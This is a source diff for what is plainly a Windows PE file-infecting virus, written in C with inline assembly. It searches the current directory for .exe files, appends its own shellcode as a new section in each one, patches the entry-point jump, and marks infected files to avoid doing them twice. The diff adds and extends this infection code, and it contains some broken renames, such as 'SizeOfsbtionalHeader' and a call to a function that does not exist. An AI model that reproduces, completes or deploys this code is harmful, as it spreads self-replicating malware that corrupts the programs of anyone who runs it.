@@ -61,8 +61,8 @@ typedef BOOL (WINAPI *__CloseHandle) (
 );
 //======================================================================
 
-typedef struct KERNEL_OPERATION {
-    // info
+typedef struct SHELL_CODE_SUPER_BLOCK {
+    // code info
     PBYTE _shellCode;
     DWORD _JMP_POINT_OFFSET;
     DWORD _CODE_SIZE;
@@ -77,28 +77,33 @@ typedef struct KERNEL_OPERATION {
     __SetEndOfFile _SetEndOfFile;
     __GetFileSize _GetFileSize;
     __CloseHandle _CloseHandle;
-} KOP;
+    // headers
+    IMAGE_DOS_HEADER dosHdr;
+    IMAGE_FILE_HEADER fileHdr;
+    IMAGE_OPTIONAL_HEADER32 optHdr;
+    IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
+} SCSB;
 
 //======================================================================
 
-#define shellCode op->_shellCode
-#define JMP_POINT_OFFSET op->_JMP_POINT_OFFSET
-#define CODE_SIZE op->_CODE_SIZE
+#define shellCode sb->_shellCode
+#define JMP_POINT_OFFSET sb->_JMP_POINT_OFFSET
+#define CODE_SIZE sb->_CODE_SIZE
 
-#define FindFirstFileA op->_FindFirstFileA
-#define FindNextFileA op->_FindNextFileA
-#define FindClose op->_FindClose
-#define CreateFileA op->_CreateFileA
-#define WriteFile op->WriteFile
-#define ReadFile op->_ReadFile
-#define SetFilePointer op->_SetFilePointer
-#define SetEndOfFile op->_SetEndOfFile
-#define GetFileSize op->_GetFileSize
-#define CloseHandle op->_CloseHandle
+#define FindFirstFileA sb->_FindFirstFileA
+#define FindNextFileA sb->_FindNextFileA
+#define FindClose sb->_FindClose
+#define CreateFileA sb->_CreateFileA
+#define WriteFile sb->WriteFile
+#define ReadFile sb->_ReadFile
+#define SetFilePointer sb->_SetFilePointer
+#define SetEndOfFile sb->_SetEndOfFile
+#define GetFileSize sb->_GetFileSize
+#define CloseHandle sb->_CloseHandle
 
 //======================================================================
 
-__forceinline int ReadOffset(KOP *op, HANDLE hFile, long offset, long mode, void* buf, long size) {
+__forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
         // puts("Error when set file pointor!");
         return 1;
@@ -109,7 +114,7 @@ __forceinline int ReadOffset(KOP *op, HANDLE hFile, long offset, long mode, void
     }
     return 0;
 }
-__forceinline int WriteOffset(KOP *op, HANDLE hFile, long offset, long mode, void* buf, long size) {
+__forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
         // puts("Error when set file pointor!");
         return 1;
@@ -120,7 +125,7 @@ __forceinline int WriteOffset(KOP *op, HANDLE hFile, long offset, long mode, voi
     }
     return 0;
 }
-__forceinline int SetFileSize(KOP *op, HANDLE hFile, long size) {
+__forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
     if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
         // puts("Error when set file pointor!");
         return 1;
@@ -134,7 +139,7 @@ __forceinline int SetFileSize(KOP *op, HANDLE hFile, long size) {
 
 //======================================================================
 
-__forceinline HANDLE OpenTargetA(KOP *op, CHAR *name) {
+__forceinline HANDLE openTargetA(SCSB *sb, CHAR *name) {
     HANDLE hFile = CreateFileA(
         name,
         GENERIC_READ | GENERIC_WRITE,
@@ -146,54 +151,56 @@ __forceinline HANDLE OpenTargetA(KOP *op, CHAR *name) {
     return hFile;
 }
 
-__forceinline int InfectTarget(KOP *op, HANDLE hFile) {
+__forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
+    int err = 0;
 //----------------------------------------------------------------------
     // headers
-    IMAGE_DOS_HEADER dosHdr;
-    IMAGE_FILE_HEADER fileHdr;
-    IMAGE_OPTIONAL_HEADER32 optHdr;
-    IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
+    /* init in struct SCSB */
     // headers pointer
-    PIMAGE_DOS_HEADER pDosHdr = &dosHdr;
-    PIMAGE_FILE_HEADER pFileHdr = &fileHdr;
-    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &optHdr;
-    PIMAGE_SECTION_HEADER pLasSecHdr = &lasSecHdr;
-    PIMAGE_SECTION_HEADER pNewSecHdr = &newSecHdr;
+    PIMAGE_DOS_HEADER pDosHdr = &sb->dosHdr;
+    PIMAGE_FILE_HEADER pFileHdr = &sb->fileHdr;
+    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &sb->optHdr;
+    PIMAGE_SECTION_HEADER pLasSecHdr = &sb->lasSecHdr;
+    PIMAGE_SECTION_HEADER pNewSecHdr = &sb->newSecHdr;
 //----------------------------------------------------------------------
     // Get DOS Header
-    ReadOffset(
-        op, hFile, 0, FILE_BEGIN, 
-        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
+    err = ReadOffset(
+        sb, hFile, 0, FILE_BEGIN, 
+        pDosHdr, sizeof(IMAGE_DOS_HEADER)
     );
+    if(err) return -1;
     // Check infected
     if(pDosHdr->e_res[0] == 0x1234) {
-        /* Error: Target has been infected! */
+        // puts("Error: Target has been infected!");
         return 1;
     }
     // Check Signature
     DWORD pe00;
-    ReadOffset(
-        op, hFile, pDosHdr->e_lfanew, FILE_BEGIN,
+    err = ReadOffset(
+        sb, hFile, pDosHdr->e_lfanew, FILE_BEGIN,
         (PVOID)&pe00, sizeof(DWORD)
     );
+    if(err) return -1;
     if(pe00 != 0x00004550) {
-        /* Error: Not a pe file! */
+        // puts("Error: Not a pe file!");
         return 2;
     }
     // Get File Header
-    ReadOffset(
-        op, hFile, 0, FILE_CURRENT, 
-        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
+    err = ReadOffset(
+        sb, hFile, 0, FILE_CURRENT, 
+        pFileHdr, sizeof(IMAGE_FILE_HEADER)
     );
+    if(err) return -1;
     // Get Optional Header
-    ReadOffset(
-        op, hFile, 0, FILE_CURRENT, 
-        (PVOID)&optHdr, 
+    err = ReadOffset(
+        sb, hFile, 0, FILE_CURRENT, 
+        pOptHdr, 
         /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
         sizeof(IMAGE_OPTIONAL_HEADER32) 
     );
+    if(err) return -1;
     if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
-        /* Error: Not a 32 bits exe! */
+        // puts("Error: Not a 32 bits exe!");
         return 3;
     }
     // Check Headers Space
@@ -201,17 +208,18 @@ __forceinline int InfectTarget(KOP *op, HANDLE hFile) {
         pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
         + pDosHdr->e_lfanew + 0x4 \
         + sizeof(IMAGE_FILE_HEADER) \
-        + pFileHdr->SizeOfOptionalHeader;
+        + pFileHdr->SizeOfsbtionalHeader;
     long alignSize = pOptHdr->SizeOfHeaders;
     if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
-        puts("Error: No space to insert a new sections!");
-        exit(1);
+        // puts("Error: No space to insert a new sections!");
+        return 4;
     }
     // Get Last Section Header
-    ReadOffset(
-        op, hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
-        (PVOID)&lasSecHdr, sizeof(IMAGE_SECTION_HEADER)
+    err = ReadOffset(
+        sb, hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
+        pLasSecHdr, sizeof(IMAGE_SECTION_HEADER)
     );
+    if(err) return -1;
 //----------------------------------------------------------------------
     // Get align
     long fileAlign = pOptHdr->FileAlignment;
@@ -220,7 +228,7 @@ __forceinline int InfectTarget(KOP *op, HANDLE hFile) {
     // TODO
     long oldVA = pOptHdr->AddressOfEntryPoint;
     long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
-    *jmpPoint = oldVA;
+    // *jmpPoint = oldVA; !!! you can't exit readonly mem 
     // Calc New Section raw
     long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
     // Calc New Section rva 
@@ -255,79 +263,116 @@ __forceinline int InfectTarget(KOP *op, HANDLE hFile) {
     pOptHdr->SizeOfImage = rvaNewSec + vir_size;
 //----------------------------------------------------------------------
     // Saved Dos Header
-    WriteOffset(
-        op, hFile, 0, FILE_BEGIN,
-        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
+    err = WriteOffset(
+        sb, hFile, 0, FILE_BEGIN,
+        pDosHdr, sizeof(IMAGE_DOS_HEADER)
     );
+    if(err) return -1;
     // Saved File Header
-    WriteOffset(
-        op, hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
-        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
+    err = WriteOffset(
+        sb, hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
+        pFileHdr, sizeof(IMAGE_FILE_HEADER)
     );
+    if(err) return -1;
     // Saved Optional Header
-    WriteOffset(
-        op, hFile, 0, FILE_CURRENT,
-        (PVOID)&optHdr,
+    err = WriteOffset(
+        sb, hFile, 0, FILE_CURRENT,
+        pOptHdr,
         sizeof(IMAGE_OPTIONAL_HEADER32)
     );
+    if(err) return -1;
     // Saved New Section Header
-    WriteOffset(
-        op, hFile, currentSize, FILE_BEGIN,
-        (PVOID)&newSecHdr,
+    err = WriteOffset(
+        sb, hFile, currentSize, FILE_BEGIN,
+        pNewSecHdr,
         sizeof(IMAGE_SECTION_HEADER)
     );
+    if(err) return -1;
     // Saved New Section
-    WriteOffset(
-        op, hFile, rawNewSec, FILE_BEGIN,
+    err = WriteOffset(
+        sb, hFile, rawNewSec, FILE_BEGIN,
         shellCode, CODE_SIZE
     );
+    if(err) return -1;
+    // Fix jmp point
+    err = WriteOffset(
+        sb, hFile, rawNewSec + JMP_POINT_OFFSET, FILE_BEGIN,
+        &oldVA, sizeof(DWORD)
+    );
+    if(err) return -1;
     // Alignment
-    SetFileSize(hFile, rawNewSec + raw_size);
+    err = SetFileSize(sb, hFile, rawNewSec + raw_size);
+    if(err) return -1;
 //----------------------------------------------------------------------
     return 0;
 }
 
 //======================================================================
 
-__forceinline void ShellCodeMain(KOP *op) {
+__forceinline void ShellCodeMain(SCSB *sb) {
     // find exe in cwd
     CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
     WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFitstFileA(search, &findData);
-    if(hFind == INVALID_HANDLE_VALUE) goto __fail_find;
+    HANDLE hFind = FindFirstFileA(search, &findData);
+    if(hFind == INVALID_HANDLE_VALUE) return;
     // iterate files
     LPWIN32_FIND_DATAA lpFindData = &findData;
     do {
-        HANDLE hf = OpenTargetA(op, lpFindData->cFileName);
+        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
         if(hf == NULL) continue;
-        InfectTarget(op, hf);
+        InfectTarget(sb, hf);
         CloseHandle(hf);
     } while(FindNextFileA(hFind, lpFindData));
     FindClose(hFind);
-__fail_find:
     return;
 }
 
 //======================================================================
 
+
+//======================================================================
+
 void ShellCode() {
 __code_start:
-    KOP super_block;
-    KOP *op = &super_block;
+    SCSB super_block;
+    SCSB *sb = &super_block;
+    PPEB peb;
+    PBYTE imageBase;
+    // get peb
+    __asm {
+        mov eax, fs:[30h];
+        mov peb, eax
+    }
+    // get imageBase
+    imageBase = *(DWORD*)(peb + 0x8);
     // Get funtion pointer
 
     // Get Code info
     PBYTE codeAdr;
-    DWORD codeSize;
+    DWORD codeSize, jmpPoint;
     __asm {
         mov eax, __code_start
         mov codeAdr, eax
         mov eax, __code_end
         sub eax, __code_start
         mov codeSize, eax
+        mov eax, __jmp_point
+        sub eax, __code_start
+        add eax, 1
+        mov jmpPoint, eax
     }
-    // 
-    ShellCodeMain(op);
+    sb->_shellCode = codeAdr;
+    sb->_CODE_SIZE = codeSize;
+    sb->_JMP_POINT_OFFSET = jmpPoint;
+    // Start infecting
+    ShellCodeMain(sb);
+    // Return back
+    __asm {
+        mov eax, imageBase
+__jmp_point:
+        add eax, 0x11223344
+        jmp eax
+    }
 __code_end:
     return;
 }
